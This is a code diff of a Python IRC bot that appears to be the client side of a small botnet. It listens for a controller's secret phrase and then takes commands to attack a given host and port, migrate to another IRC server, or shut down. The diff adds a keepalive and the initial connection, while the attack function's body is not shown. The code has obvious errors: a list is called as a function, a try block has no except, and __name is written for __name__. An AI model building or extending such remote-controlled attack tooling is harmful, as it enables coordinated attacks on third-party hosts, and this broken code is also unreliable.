@@ -12,7 +12,7 @@ CONTROLLER_FLAG = True
 IRCSOCKET = None
 
 
-# BOT TODO
+# BOT REQUIREMENTS
 # Listen on channel and detect secret phrase from controller
 # Execute commands sent by controller to channel
 # Commands: Network attack, migration to different IRC, ShutDown
@@ -36,16 +36,13 @@ def joinIRC(IRCSOCKET, CHANNEL):
     sendMsg(IRCSOCKET, "NICK " + botNick + "\n")
     sendMsg(IRCSOCKET, "JOIN " + CHANNEL + "\n")
 
-# FOR PINGPONG
-def ping():
-    # https://linuxacademy.com/blog/geek/creating-an-irc-bot-with-python3/
-    IRCSOCKET.send(bytes("PONG :pingis\n", "UTF-8"))
-
 # THESE ARE THE FUNCTIONS FOR THE COMMANDS
 def getStatus():    
     return 
 
 # Attack a host 
+# Increment counter if attack is successful
+# Message controller if successful
 def cmdAttack(conNick, host, port):
     global attackCounter, botNick, conNick
     # Initialize attack
@@ -89,6 +86,10 @@ def getCommand(IRCSOCKET):
     if msg == "":
         return False
     else:
+        # Keep sending PONG to let controller bot is still alive
+        # https://pythonspot.com/en/building-an-irc-bot/
+        if msg.find('PING') != -1: 
+            sendMsg('PONG ' + msg.split()[1] + '\r\n')
         return msg
 
 # DO COMMANDS
@@ -97,40 +98,45 @@ def commandHandler():
     # Get Commands
     # status, attack <host><port>, move<host><port><channel>, quit, shutdown
     command = getCommand(IRCSOCKET)
-    command = command.split()
+    command = command.split() #split msg from return
 
-    # Check if secretPhrase has been said at the end
-    if command(len(command) - 1) == PHRASE:
-        # Check for commands if secretPhrase has been said 
+    if command != False:
+        try:
+            # Check if secretPhrase has been said at the end
+            if command(len(command) - 1) == PHRASE:
+                # Check for commands if secretPhrase has been said 
 
-        # Get status of bot
-        if command == "status":
-            print("Command: status")
-            cmdStatus = getStatus()
-            print(str(status))
+                # Get status of bot
+                if command == "status":
+                    print("Command: status")
+                    cmdStatus = getStatus()
+                    print(str(status))
 
-        # Start attack
-        elif command == "attack":
-            try:
-                host = command[1]
-                port = command[2]
-                print("Command: attack " + str(host) + " " + str(port))
-                cmdAttack(host, port)
-            except:
-                pass
+                # Start attack
+                elif command == "attack":
+                    try:
+                        host = command[1]
+                        port = command[2]
+                        print("Command: attack " + str(host) + " " + str(port))
+                        cmdAttack(host, port)
+                    except:
+                        pass
 
-        # Move to another IRC channel
-        elif command == "move":
-            try:
-                host = command[1]
-                port = command[2]
-                channel = command[3]
-                cmdMove(host, port, channel)
-                print("Command: move " + str(host) + " " + str(port) + " " + str(channel))
-        elif command == "quit":
-            cmdQuit()
-        elif command == "shutdown":
-            cmdShutdown()
+                # Move to another IRC channel
+                elif command == "move":
+                    try:
+                        host = command[1]
+                        port = command[2]
+                        channel = command[3]
+                        cmdMove(host, port, channel)
+                        print("Command: move " + str(host) + " " + str(port) + " " + str(channel))
+                elif command == "quit":
+                    cmdQuit()
+                elif command == "shutdown":
+                    cmdShutdown()
+        except:
+            # No valid command given
+            pass
 
 # THIS IS WHERE ALL THE COMMUNICATION STUFF HAPPENS
 
@@ -165,6 +171,15 @@ if __name == "__main__":
     if not PORT.isdigit():
         print("Invalid port")
         sys.exit()
+
+    # Initial Connection + Join channel
+    try:
+        IRCSOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    except:
+        print("Unable to initially connect to IRC server")
+        sys.exit() 
+
+    joinIRC(IRCSOCKET, CHANNEL)
 
     # Keep Connection to IRC Server
     while True:
